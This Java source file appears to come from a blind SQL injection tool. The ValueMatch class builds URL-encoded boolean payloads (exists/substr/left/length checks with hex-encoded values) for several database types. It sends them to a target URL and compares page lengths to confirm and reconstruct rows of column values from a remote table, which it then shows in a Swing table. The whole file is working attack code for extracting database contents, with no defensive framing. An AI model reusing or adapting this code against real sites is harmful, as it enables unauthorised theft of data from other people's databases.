package com.sql;

import java.util.ArrayList;
import java.util.List;
import java.util.Vector;

import javax.swing.table.DefaultTableModel;

public class ValueMatch {
	public String url;
	public int indexOfNumberInjection;
	public int indexOfCharInjection;
	public String urlHead;
	public String urlEnd;
	public int DBType;
	public List<String> columnName;
	private String tableName;
	private List<List<String>> valueNotMatched;
	private List<List<String>> value;
	private DefaultTableModel showValue;
	private int contentLen;
	public ValueMatch(String strUrl, String tableName,
			List<String> columnName, List<List<String>> valueNotMatched, String urlHead,
			String urlEnd, int DBType,DefaultTableModel showValue,List<List<String>> value) {
		// TODO Auto-generated constructor stub
		this.DBType = DBType;
		this.url = strUrl;
		this.urlHead = urlHead;
		this.urlEnd = urlEnd;
		this.columnName=columnName;
		this.tableName=tableName;
		this.valueNotMatched=valueNotMatched;
		this.value=value;
		this.showValue=showValue;
		this.contentLen=IsExistInjection.getContent(this.url).length();
		makeMap();
		Integer indexOfRecord=1;
		Vector<String> row;
		for(int i=0;i<value.size();i++){
			row=new Vector<String>();
			row.addElement(indexOfRecord.toString());
			for(int j=0;j<value.get(i).size();j++){
				row.addElement(value.get(i).get(j));
			}
			indexOfRecord++;
			this.showValue.addRow(row);
		}
	}
	public void makeMap() {
	
		getFirstMap();
		if (columnName.size() == 2)
			return ;
		for (int i = 2; i < columnName.size(); i++) {
			getOtherMap(valueNotMatched.get(i));
		}
	}

	public void getFirstMap() {
		if (columnName.size() < 2) {
			return;
		}
		for (int i = 0; i < valueNotMatched.get(0).size(); i++) {
			for (int j = 0; j < valueNotMatched.get(1).size(); j++) {
				String testUrl = "";
				List<String> tmp = new ArrayList<String>();
				if (DBType == 0 || DBType == 2) {
					testUrl = urlHead + "exists(select%20*%20from%20"
							+ tableName + "%20where%20substr("
							+ columnName.get(0) + ",1,"
							+ valueNotMatched.get(0).get(i).length() + ")"
							+ "%20=%20'" + turnToAsc(valueNotMatched.get(0).get(i))
							+ "'%20and%20substr(" + columnName.get(1) + ",1,"
							+ valueNotMatched.get(1).get(j).length() + ")"
							+ "%20=%20'" + turnToAsc(valueNotMatched.get(1).get(j)) +"'%20and%20length(" + columnName.get(0) + ")="
							+ valueNotMatched.get(0).get(i).length()
							+ "%20and%20length(" + columnName.get(1) +")="
							+ valueNotMatched.get(1).get(j).length() + ")" + urlEnd;
				} else {
					testUrl = urlHead + "exists(select%20*%20from%20"
							+ tableName + "%20where%20left(" + columnName.get(0)
							+ "," + valueNotMatched.get(0).get(i).length() + ")='"
							+ turnToAsc(valueNotMatched.get(0).get(i)) + "'%20and%20left("
							+ columnName.get(1) + ","
							+ valueNotMatched.get(1).get(j).length() + ")='"
							+ turnToAsc(valueNotMatched.get(1).get(j)) + "'%20and%20len("
							+ columnName.get(0) + ")="
							+ valueNotMatched.get(0).get(i).length()
							+ "%20and%20len(" + columnName.get(1) + ")="
							+ valueNotMatched.get(1).get(j).length() + ")" + urlEnd;
				}
				if (IsExistInjection.isRightPage(this.contentLen, testUrl)) {
					tmp.add(valueNotMatched.get(0).get(i));
					tmp.add(valueNotMatched.get(1).get(j));
					value.add(tmp);
				}
			}
		}
	}

	public void getOtherMap( List<String> columnValue) {
	
		int i, j, k;
		String sql = null;
		String testsql;
		for (i = 0; i < value.size(); i++) {
			if (DBType == 0 || DBType == 2) {
				sql = "exists(select%20*%20from%20" + tableName
						+ "%20where%20substr(" + columnName.get(0) + ",1,"
						+ value.get(i).get(0).length() + ")" + "%20=%20'"
						+ turnToAsc(value.get(i).get(0)) +"'%20and%20length("
						+ columnName.get(0) + ")=" + value.get(i).get(0).length();
			} else {
				sql = "exists(select%20*%20from%20" + tableName
						+ "%20where%20left(" + columnName.get(0) + ","
						+ value.get(i).get(0).length() + ")='"
						+ turnToAsc(value.get(i).get(0)) + "'%20and%20len("
						+ columnName.get(0) + ")=" + value.get(i).get(0).length();
			}
			for (j = 1; j < value.get(i).size(); j++) 
				sql = addWhere(sql, columnName.get(j), value.get(i).get(j));
			for (k = 0; k < columnValue.size(); k++) {
				if (DBType == 0 || DBType == 2) {
					testsql = urlHead + sql + "%20and%20substr("
							+ columnName.get(j) + ",1,"
							+ columnValue.get(k).length() + ")" + "%20=%20'"
							+ turnToAsc(columnValue.get(k)) +  "'%20and%20length("
							+ columnName.get(j) + ")="
							+ columnValue.get(k).length() + ")" + urlEnd;
				} else {
					testsql = urlHead + sql + "%20and%20left("
							+ columnName.get(j) + ","
							+ columnValue.get(k).length() + ")='"
							+ turnToAsc(columnValue.get(k)) + "'%20and%20len("
							+ columnName.get(j) + ")="
							+ columnValue.get(k).length() + ")" + urlEnd;
				}
				if (IsExistInjection.isRightPage(this.contentLen, testsql)) 
					value.get(i).add(columnValue.get(k));
			}
		}
	}

	public String addWhere(String sql, String anotherField, String anotherValue) {
		if (DBType == 0 || DBType == 2) {
			return sql + "%20and%20substr(" + anotherField + ",1,"
					+ anotherValue.length() + ")" + "%20=%20'"
					+ turnToAsc(anotherValue) + "'%20and%20length(" + anotherField + ")="
					+ anotherValue.length();
		} else {
			return sql + "%20and%20left(" + anotherField + ","
					+ anotherValue.length() + ")='" + turnToAsc(anotherValue) + "'%20and%20len(" + anotherField + ")="
					+ anotherValue.length();
		}
	}
	public String turnToAsc(String str){
		char s[]=str.toCharArray();
		String ss="";
		for(int i=0;i<s.length;i++)
			ss=ss+"%"+Integer.toHexString(s[i]);
		return ss;
	}
}
